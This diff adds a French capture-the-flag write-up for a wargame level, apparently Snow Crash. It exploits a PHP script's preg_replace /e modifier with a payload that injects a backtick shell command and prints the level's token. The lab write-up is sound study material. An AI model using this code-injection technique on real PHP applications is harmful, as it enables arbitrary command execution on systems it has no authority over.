@@ -1,0 +1,53 @@
+-----------------------------------------------------------
+                          LEVEL06
+-----------------------------------------------------------
+
+1. On regarde les fichiers mis à notre disposition, on
+   a un executable et un script php
+   --------------------------------------------------------
+   CMD : ls
+   OUTPUT : level06  level06.php
+
+2. On inspecte le contenu du script php
+   --------------------------------------------------------
+   CMD : cat level06.php
+   OUTPUT : #!/usr/bin/php
+            <?php
+            function y($m) { $m = preg_replace("/\./", " x ", $m); 
+               $m = preg_replace("/@/", " y", $m); return $m; }
+            function x($y, $z) { $a = file_get_contents($y); 
+               $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+               $a = preg_replace("/\[/", "(", $a); 
+               $a = preg_replace("/\]/", ")", $a); 
+               return $a; }
+            $r = x($argv[1], $argv[2]); print $r;
+            ?>
+
+3. On constate que le flag regex '/e' est utilisé, ce qui 
+   empêche la verification du type de ce qui est passé au 
+   regex mais tout en vérifant le format
+
+4. On inspecte également l'executable 
+   --------------------------------------------------------
+   CMD : strings level06
+   OUTPUT : [...]
+            /home/user/level06/level06.php
+            [...]
+
+4. À partir de là, on créé un fichier /tmp/test qui contient
+   un string au format du regex qui devrait pouvoir exécuter 
+   getflag
+   --------------------------------------------------------
+   CMD : echo '[x ${`getflag`}]' > /tmp/test
+
+5. En suite, on execute level06 en passant en paramètre le
+   fichier /tmp/test qu'on vient de créer. Le php va 
+   planter et en essayant d'afficher le nom de la variable
+   qui cause le problème, ${`getflag`} va être exécuté param
+   le shell et va donc afficher le token.
+   --------------------------------------------------------
+   CMD : ./level06 /tmp/test
+   OUTPUT : PHP Notice:  
+            Undefined variable: 
+            Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+            in /home/user/level06/level06.php(4) : regexp code on line 1
